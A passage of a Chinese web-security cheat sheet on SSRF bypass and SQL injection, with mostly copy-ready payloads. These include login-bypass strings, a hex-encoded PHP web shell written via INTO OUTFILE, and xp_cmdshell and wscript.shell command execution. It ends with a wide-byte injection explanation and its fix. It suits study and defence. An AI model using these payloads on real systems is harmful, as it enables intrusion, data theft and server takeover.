+<h4 id="ssrf-漏洞中-url-地址过滤的绕过">SSRF 漏洞中 URL 地址过滤的绕过</h4>
+<ol>
+<li><a href="http://www.baidu.com@10.10.10.10%E4%B8%8Ehttp://10.10.10.10">http://www.baidu.com@10.10.10.10与http://10.10.10.10</a> 请求是相同的</li>
+<li>ip 地址转换成进制来访问</li>
+</ol>
+<h4 id="利用方式">利用方式</h4>
+<ol>
+<li>
+<p>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</p>
+</li>
+<li>
+<p>攻击运行在内网或本地的应用程序（比如溢出）</p>
+</li>
+<li>
+<p>对内网 web 应用进行指纹识别，通过访问默认文件实现</p>
+</li>
+<li>
+<p>攻击内外网的 web 应用，主要是使用 get 参数就可以实现的攻击（比如 struts2，sqli 等）</p>
+</li>
+<li>
+<p>利用 file 协议读取本地文件等</p>
+</li>
+</ol>
+<h3 id="sql-注入">SQL 注入</h3>
+<h4 id="类型">类型</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">4、联合查询注入，可以使用union的情况下的注入。</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">5、堆查询注入，可以同时执行多条语句的执行时的注入。</span></span></code></pre>
+<h4 id="原理-2">原理</h4>
+<p>所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单 提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。具体来说，它是利用现有应用程序，将（恶意）的 SQL 命令注入到后台数据库引擎执行的能力，它可以通过在 Web 表单中输入（恶意）SQL 语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行 SQL 语句</p>
+<p>① 不当的类型处理；② 不安全的 数据 库配置；③ 不合理的查询集处理；④ 不当的错误处理；⑤ 转义字符处理不合适；⑥ 多个提交处理不当</p>
+<ol>
+<li>用户输入</li>
+<li>后端处理输入数据，构建 sql 语句</li>
+<li>提交给 DBMS 执行 sql 代码</li>
+<li>记录运行状态和结果，返回后端</li>
+<li>后端判断</li>
+<li>前端反馈</li>
+</ol>
+<h4 id="sqlmap-为什么讲注入分类">sqlmap 为什么讲注入分类</h4>
+<p>区别只给出有或无</p>
+<h4 id="sqli-能用来干什么">SQLI 能用来干什么</h4>
+<ol>
+<li>绕过验证</li>
+<li>写 shell</li>
+<li>dump 数据</li>
+<li>执行系统命令</li>
+</ol>
+<h4 id="sqli-思路首先测试什么">SQLI 思路，首先测试什么</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">类型</span></span>
+<span class="line"><span style="color:#abb2bf">过滤字符</span></span>
+<span class="line"><span style="color:#abb2bf">waf</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">报错：单引号 注释(--, #, /*comment*/, /*!mysql*/, ), 除0, 类型错误</span></span>
+<span class="line"><span style="color:#abb2bf">堆查询: 支持: asp/asp.net/php + mssql    php + postgreSQL</span></span>
+<span class="line"><span style="color:#abb2bf">       不支持: php + mysql, asp/asp.net/php/java + access, java + oracle</span></span>
+<span class="line"><span style="color:#abb2bf">IF:</span></span>
+<span class="line"><span style="color:#abb2bf">    mysql: SELECT IF (1=1,'true','false')</span></span>
+<span class="line"><span style="color:#abb2bf">    mssql: IF (1=1) SELECT 'true' ELSE SELECT 'false'</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">16hex:</span></span>
+<span class="line"><span style="color:#abb2bf">    SELECT CHAR(0x66)(S)</span></span>
+<span class="line"><span style="color:#abb2bf">    SELECT 0x5045(M) (这不是一个整数，而会是一个16进制字符串）</span></span>
+<span class="line"><span style="color:#abb2bf">    SELECT 0x50 + 0x45(M) (现在这是整数了)</span></span></code></pre>
+<h4 id="mysql-和-sqlserver-注入时的区别">MySQL 和 SQLServer 注入时的区别</h4>
+<p>MSSQL 基本表<code>master, msdb, mssqlweb, empdb, model</code></p>
+<blockquote>
+<p>库名</p>
+</blockquote>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#c678dd">select</span><span style="color:#abb2bf"> group_concat(</span><span style="color:#c678dd">distinct</span><span style="color:#abb2bf"> table_name) </span><span style="color:#c678dd">from</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">information_schema</span><span style="color:#abb2bf">.</span><span style="color:#d19a66">columns</span><span style="color:#abb2bf"> </span><span style="color:#c678dd">where</span><span style="color:#abb2bf"> table_schema</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">database</span><span style="color:#abb2bf">()</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#c678dd">select</span><span style="color:#abb2bf"> </span><span style="color:#c678dd">name</span><span style="color:#abb2bf"> </span><span style="color:#c678dd">from</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">master</span><span style="color:#abb2bf">.</span><span style="color:#d19a66">dbo</span><span style="color:#abb2bf">.sysdatabases </span><span style="color:#c678dd">where</span><span style="color:#abb2bf"> </span><span style="color:#c678dd">dbid</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span><span style="color:#abb2bf"> </span><span style="color:#c678dd">union</span><span style="color:#abb2bf"> </span><span style="color:#c678dd">select</span><span style="color:#abb2bf"> </span><span style="color:#c678dd">name</span><span style="color:#abb2bf"> </span><span style="color:#c678dd">from</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">yourdatabasename</span><span style="color:#abb2bf">.</span><span style="color:#d19a66">dbo</span><span style="color:#abb2bf">.sysobjects </span><span style="color:#c678dd">where</span><span style="color:#abb2bf"> xtype</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">char</span><span style="color:#abb2bf">(</span><span style="color:#d19a66">85</span><span style="color:#abb2bf">) </span><span style="color:#c678dd">and</span><span style="color:#abb2bf"> </span><span style="color:#c678dd">name</span><span style="color:#abb2bf"> </span><span style="color:#c678dd">not</span><span style="color:#abb2bf"> </span><span style="color:#c678dd">in</span><span style="color:#abb2bf"> (</span><span style="color:#c678dd">select</span><span style="color:#abb2bf"> </span><span style="color:#c678dd">top</span><span style="color:#abb2bf"> XX </span><span style="color:#c678dd">name</span><span style="color:#abb2bf"> </span><span style="color:#c678dd">from</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">yourdatabasename</span><span style="color:#abb2bf">.</span><span style="color:#d19a66">dbo</span><span style="color:#abb2bf">.sysobjects </span><span style="color:#c678dd">where</span><span style="color:#abb2bf"> xtype</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">char</span><span style="color:#abb2bf">(</span><span style="color:#d19a66">85</span><span style="color:#abb2bf">))</span><span style="color:#7f848e;font-style:italic">--</span></span></code></pre>
+<blockquote>
+<p>获得表段的总序号（与 id 不同）</p>
+</blockquote>
+<p><code>union select id from yourdatabasename.dbo.sysobjects where xtype=char(85) and name not in (select top XX name from yourdatabasename.dbo.sysobjects where xtype=char(85))-- </code></p>
+<blockquote>
+<p>根据表的序号一个个列出字段的名字</p>
+</blockquote>
+<p><code>union select name from yourdatabasename.dbo.syscolumns where ID=2073058421 and name not in (select top XX name from yourdatabasename.dbo.syscolumns where ID=2073058421 )-- </code></p>
+<h4 id="postgresql">PostgreSQL</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">union select datname from pg_database order by 11    #猜字段</span></span>
+<span class="line"><span style="color:#abb2bf">and (select length(current_database())) between 0,30 　　　　　　#判断数据库长度</span></span>
+<span class="line"><span style="color:#abb2bf">and(select ascii(substr(current_database(),1,1))) between 0,64　　#判断数据库名的第１位是否是在０,64的ascii码之间。</span></span>
+<span class="line"><span style="color:#abb2bf">select relname from pg_stat_user_tables limit 1 offset n;</span></span>
+<span class="line"><span style="color:#abb2bf">and(select count(*) from pg_stat_user_tables) between 0,64　　#判断数据库表数</span></span>
+<span class="line"><span style="color:#abb2bf">and(select length(relname) from pg_stat_user_tables limit 1 offset 0) between 0,64　　#判断数据库表第一个表的长度</span></span>
+<span class="line"><span style="color:#abb2bf">and(select ascii(substr(relname,1,1)) from pg_stat_user_tables limit 1 offset 0) between 0,64　　#判断数据库第一张表的第一个字符</span></span></code></pre>
+<h4 id="rand02-报错原理">rand(0)*2 报错原理</h4>
+<p><code>select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a</code></p>
+<p><code>floor(rand(0)*2):011011011</code></p>
+<p><code>插入相同值, 第二次计算不同: 保证在开始的查询结果中, 不能让虚表中存在0, 1键值</code></p>
+<ol>
+<li>
+<p>首先建立了一个虚表</p>
+</li>
+<li>
+<p>取第一条数据，执行 floor(rand(0) * 2)，结果为 0（<strong>第一次计算</strong>），查询虚表，发现键值 0 不存在，在进行一次计算，结果为 1（<strong>第一次插入</strong>），插入到表中；</p>
+</li>
+<li>
+<p>取出第二条数据，执行 floor(rand(0) _ 2)，结果为 1（<strong>第二次计算</strong>），查询虚表，记录存在，直接 count(_)加一；</p>
+</li>
+<li>
+<p>取出第三条数据，执行 floor(rand(0) * 2)，结果为 0（<strong>第三次计算</strong>），查询虚表，发现不存在键值 0，在进行一次计算，结果 1(<strong>第二次插入</strong>)，插入到虚表中作为虚表的主键，与之前的 1 冲突，这时候就会报错了。</p>
+</li>
+</ol>
+<h4 id="sqli-如何写-shell">SQLI 如何写 shell</h4>
+<blockquote>
+<p>MySQL</p>
+</blockquote>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">select 0x3c3f706870206576616c28245f504f53545b277a275d293b3f3e,2,3,4 from mysql.user into outfile '/var/www/html/z.php';</span></span></code></pre>
+<ol>
+<li>需要知道 Web 目录的绝对路径</li>
+<li>需要 mysql 用户有 file 权限，file 权限限制在 MySQL 服务器上读写文件。grant file on <em>.</em> to root@localhost</li>
+<li>因为执行时以 mysql 用户去执行，所以 mysql 用户需要有 Web 目录的写权限</li>
+<li>有代码执行位置(可控位置)</li>
+</ol>
+<h4 id="sqli-单引号被过滤怎么办">SQLI 单引号’被过滤怎么办</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">编码 unicode hex</span></span>
+<span class="line"><span style="color:#abb2bf">GBK</span></span>
+<span class="line"><span style="color:#abb2bf">`</span></span>
+<span class="line"><span style="color:#abb2bf">函数 char</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">有很多使用字符串的方法，但是这几个方法是一直可用的。使用CHAR()(MS)和CONCAT()(M)来生成没有引号的字符串</span></span>
+<span class="line"><span style="color:#abb2bf">0x457578 (M) - 16进制编码的字符串</span></span>
+<span class="line"><span style="color:#abb2bf">SELECT 0x457578</span></span>
+<span class="line"><span style="color:#abb2bf">这在MySQL中会被当做字符串处理</span></span>
+<span class="line"><span style="color:#abb2bf">在MySQL中使用16进制字符串的一个简单方式： SELECT CONCAT('0x',HEX('c:\\boot.ini'))</span></span>
+<span class="line"><span style="color:#abb2bf">在MySQL中使用CONCAT()函数： SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77)) (M)</span></span>
+<span class="line"><span style="color:#abb2bf">这会返回'KLM'</span></span>
+<span class="line"><span style="color:#abb2bf">SELECT CHAR(75)+CHAR(76)+CHAR(77) (S)</span></span>
+<span class="line"><span style="color:#abb2bf">这会返回'KLM'</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">eg:</span></span>
+<span class="line"><span style="color:#abb2bf">    M:SELECT LOAD_FILE(0x633A5C626F6F742E696E69)</span></span></code></pre>
+<h4 id="绕过登陆界面smo">绕过登陆界面(SMO+)</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">SQL注入101式(大概是原文名字吧？),登陆小技巧</span></span>
+<span class="line"><span style="color:#abb2bf">admin' --</span></span>
+<span class="line"><span style="color:#abb2bf">admin' #</span></span>
+<span class="line"><span style="color:#abb2bf">admin'/*</span></span>
+<span class="line"><span style="color:#abb2bf">' or 1=1--</span></span>
+<span class="line"><span style="color:#abb2bf">' or 1=1#</span></span>
+<span class="line"><span style="color:#abb2bf">' or 1=1/*</span></span>
+<span class="line"><span style="color:#abb2bf">') or '1'='1--</span></span>
+<span class="line"><span style="color:#abb2bf">') or ('1'='1--</span></span>
+<span class="line"><span style="color:#abb2bf">....</span></span>
+<span class="line"><span style="color:#abb2bf">以不同的用户登陆 (SM*) ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--</span></span>
+<span class="line"><span style="color:#abb2bf">**旧版本的MySQL不支持union*</span></span></code></pre>
+<h4 id="绕过-md5-哈希检查的例子msp">绕过 MD5 哈希检查的例子(MSP)</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">用户名：admin</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">密码：1234 ' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055</span></span>
+<span class="line"><span style="color:#abb2bf">其中81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)</span></span></code></pre>
+<h4 id="mysql-字符串连接">MySQL 字符串连接</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">+(S)</span></span>
+<span class="line"><span style="color:#abb2bf">SELECT login + '-' + password FROM members</span></span>
+<span class="line"><span style="color:#abb2bf">|| (*MO)</span></span>
+<span class="line"><span style="color:#abb2bf">SELECT login || '-' || password FROM members</span></span>
+<span class="line"><span style="color:#abb2bf">*关于MySQL的"||" 这个仅在ANSI模式下的MySQL执行，其他情况下都会当成'逻辑操作符'并返回一个0。更好的做法是使用CONCAT()函数。</span></span>
+<span class="line"><span style="color:#abb2bf">CONCAT(str1, str2, str3, ...)(M)</span></span>
+<span class="line"><span style="color:#abb2bf">连接参数里的所有字符串 例：SELECT CONCAT(login, password) FROM members</span></span></code></pre>
+<h4 id="使用-having-来探测字段名s">使用 HAVING 来探测字段名(S)</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">' HAVING 1=1 --</span></span>
+<span class="line"><span style="color:#abb2bf">' GROUP BY table.columnfromerror1 HAVING 1=1 --</span></span>
+<span class="line"><span style="color:#abb2bf">' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --</span></span>
+<span class="line"><span style="color:#abb2bf">……</span></span>
+<span class="line"><span style="color:#abb2bf">' GROUP BY table.columnfromerror1, columnfromerror2,columnfromerror(n) HAVING 1=1 --</span></span></code></pre>
+<h4 id="在-select-查询中使用-order-by-探测字段数mso">在 SELECT 查询中使用 ORDER BY 探测字段数(MSO+)</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">通过ORDER BY来探测字段数能够加快union注入的速度。</span></span>
+<span class="line"><span style="color:#abb2bf">ORDER BY 1--</span></span>
+<span class="line"><span style="color:#abb2bf">ORDER BY 2--</span></span>
+<span class="line"><span style="color:#abb2bf">……</span></span>
+<span class="line"><span style="color:#abb2bf">ORDER BY N--</span></span>
+<span class="line"><span style="color:#abb2bf">一直到它报错为止，最后一个成功的数字就是字段数。</span></span></code></pre>
+<h4 id="数据类型union之类的">数据类型、UNION、之类的</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">经常给UNION配上ALL使用，因为经常会有相同数值的字段，而缺省情况下UNION都会尝试返回唯一值(records with distinct)</span></span>
+<span class="line"><span style="color:#abb2bf">如果你每次查询只能有一条记录，而你不想让原本正常查询的记录占用这宝贵的记录位，你可以使用-1或者根本不存在的值来搞定原查询（前提是注入点在WHERE里）。</span></span>
+<span class="line"><span style="color:#abb2bf">在UNION中使用NULL，对于大部分数据类型来说这样都比瞎猜字符串、日期、数字之类的来得强</span></span>
+<span class="line"><span style="color:#abb2bf">盲注的时候要小心判断错误是来自应用的还是来自数据库的。因为像ASP.NET就经常会在你使用NULL的时候抛出错误（因为开发者们一般都没想到用户名的框中会出现NULL）</span></span></code></pre>
+<h4 id="获取字段类型">获取字段类型</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">' union select sum(columntofind) from users-- (S)</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a **varchar** data type as an argument. 如果没有返回错误说明字段是数字类型</span></span>
+<span class="line"><span style="color:#abb2bf">同样的，你可以使用CAST()和CONVERT()</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--</span></span>
+<span class="line"><span style="color:#abb2bf">11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-</span></span>
+<span class="line"><span style="color:#abb2bf">没报错 - 语法是正确的。 这是MS SQL Server的语法。 继续。</span></span>
+<span class="line"><span style="color:#abb2bf">11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-</span></span>
+<span class="line"><span style="color:#abb2bf">没报错 – 第一个字段是integer类型。</span></span>
+<span class="line"><span style="color:#abb2bf">11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 --</span></span>
+<span class="line"><span style="color:#abb2bf">报错 – 第二个字段不是integer类型</span></span>
+<span class="line"><span style="color:#abb2bf">11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –-</span></span>
+<span class="line"><span style="color:#abb2bf">没报错 – 第二个字段是string类型。</span></span>
+<span class="line"><span style="color:#abb2bf">11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 –-</span></span>
+<span class="line"><span style="color:#abb2bf">报错 – 第三个字段不是integer</span></span>
+<span class="line"><span style="color:#abb2bf">……</span></span>
+<span class="line"><span style="color:#abb2bf">Microsoft OLE DB Provider for SQL Server error '80040e07' Explicit conversion from data type int to image is not allowed.</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">你在遇到union错误之前会先遇到convert()错误，所以先使用convert()再用union</span></span></code></pre>
+<h4 id="有用的函数信息收集内置程序大量注入笔记">有用的函数、信息收集、内置程序、大量注入笔记</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">--&gt;@@version(MS)</span></span>
+<span class="line"><span style="color:#abb2bf">数据库的版本。这是个常量，你能把它当做字段来SELECT，而且不需要提供表名。同样的你也可以用在INSERT/UPDATE语句里面，甚至是函数里面。</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">INSERT INTO members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10)</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">--&gt;文件插入(Bulk Insert)(S)</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">把文件内容插入到表中。如果你不知道应用目录你可以去读取IIS metabase file(仅IIS 6)(%systemroot%\system32\inetsrv\MetaBase.xml)然后在里面找到应用目录。</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">新建一个表foo(line varchar(8000))</span></span>
+<span class="line"><span style="color:#abb2bf">BULK INSERT foo FROM 'c:\inetpub\wwwroot\login.asp'</span></span>
+<span class="line"><span style="color:#abb2bf">DROP了临时表，重复另一个文件</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">--&gt;BCP(S)</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">写入文件。这个功能需要登录 bcp "SELECT * FROM test..foo" queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">--&gt;SQL Server的VBS/WSH(S)</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">由于ActiveX的支持，你能在SQL Server中使用VBS/WSH</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe'</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">Username: '; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' --</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">--&gt;执行系统命令，xp_cmdshell(S)</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">众所周知的技巧，SQL Server 2005默认是关闭的。你需要admin权限</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">用ping简单的测试一下，用之前先检查一下防火墙和嗅探器。</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">EXEC master.dbo.xp_cmdshell 'ping '</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">如果有错误，或者union或者其他的什么，你都不能直接读到结果。</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">--&gt;SQL Server中的一些特殊的表(S)</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">Error Messages</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">master..sysmessages</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">Linked Servers</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">master..sysservers</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">Password (2000和2005版本的都能被破解，这俩的加密算法很相似)</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">SQL Server 2000: masters..sysxlogins</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">SQL Server 2005 : sys.sql_logins</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">--&gt;SQL Server的其它内置程序(S)</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">命令执行 (xp_cmdshell)</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">exec master..xp_cmdshell 'dir'</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">注册表操作 (xp_regread)</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">xp_regaddmultistring</span></span>
+<span class="line"><span style="color:#abb2bf">xp_regdeletekey</span></span>
+<span class="line"><span style="color:#abb2bf">xp_regdeletevalue</span></span>
+<span class="line"><span style="color:#abb2bf">xp_regenumkeys</span></span>
+<span class="line"><span style="color:#abb2bf">xp_regenumvalues</span></span>
+<span class="line"><span style="color:#abb2bf">xp_regread</span></span>
+<span class="line"><span style="color:#abb2bf">xp_regremovemultistring</span></span>
+<span class="line"><span style="color:#abb2bf">xp_regwrite</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet \Services\lanmanserver\parameters', 'nullsessionshares' exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM \CurrentControlSet \Services\snmp\parameters\validcommunities'</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">管理服务(xp_servicecontrol)</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">媒体(xp_availablemedia)</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">ODBC 资源 (xp_enumdsn)</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">登录 (xp_loginconfig)</span></span>
+<span class="line"><span style="color:#abb2bf">创建Cab文件 (xp_makecab)</span></span>
+<span class="line"><span style="color:#abb2bf">域名列举 (xp_ntsec_enumdomains)</span></span>
+<span class="line"><span style="color:#abb2bf">杀进程 (need PID) (xp_terminate_process)</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">新建进程 (实际上你想干嘛都行)</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’ exec xp_webserver</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">写文件进UNC或者内部路径 (sp_makewebtask)</span></span></code></pre>
+<h4 id="宽字节注入原理在哪里编码如何防范">宽字节注入原理，在哪里编码，如何防范</h4>
+<ol>
+<li>GBK 的 php， Addslashes 在’前加了 0x5c 与前一个字节拼接成了一个字，导致 0x27 落单</li>
+<li>MySQL 存储的字符集 字段&gt;表&gt;库&gt;服务器</li>
+<li>PHP 作为客户端连接 MySQL 时，这个字符集就是 PHP 文件默认的编码</li>
+<li>character_set_client 和 character_set_connection 不同导致问题</li>
+</ol>
+<blockquote>
+<p>指定三个字符集（客户端、连接层、结果集）都是 GBK 编码%df%27-&gt;(addslashes)-&gt;%df%5c%27-&gt;(GBK)-&gt;运’</p>
+<p>使用 set names UTF-8 指定了 UTF-8 字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的 GBK 字符使用 iconv 函数（或者 mb_convert_encoding）先转为 UTF-8，然后再拼接入 SQL 语句 e55c27====(addslashes)====&gt;e55c5c5c27====(iconv)====&gt;e98ca65c5c27 (e55c 转为 UTF-8 为 e98ca6)</p>
+<p>使用 iconv 进行字符集转换，将 UTF-8 转为 GBK，同时，set names 字符集为 GBK。提交%e9%8c%a6 即可。
+这个情景的大前提是先编码后转义: e98ca6====(iconv)=====&gt;e55c=====(addslashes)====&gt;e55c5c</p>
+</blockquote>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">修复</span></span>
+<span class="line"><span style="color:#abb2bf">（1）使用mysql_set_charset(GBK)指定字符集</span></span>
+<span class="line"><span style="color:#abb2bf">（2）使用mysql_real_escape_string进行转义</span></span>
+<span class="line"><span style="color:#abb2bf">mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面e5和5c拼接为一个宽字节的问题，但是这个“当前字符集”如何确定呢？</span></span>
+<span class="line"><span style="color:#abb2bf">就是使用mysql_set_charset进行指定。</span></span>
+<span class="line"><span style="color:#abb2bf">上述的两个条件是“与”运算的关系，少一条都不行</span></span></code></pre>
+<blockquote>
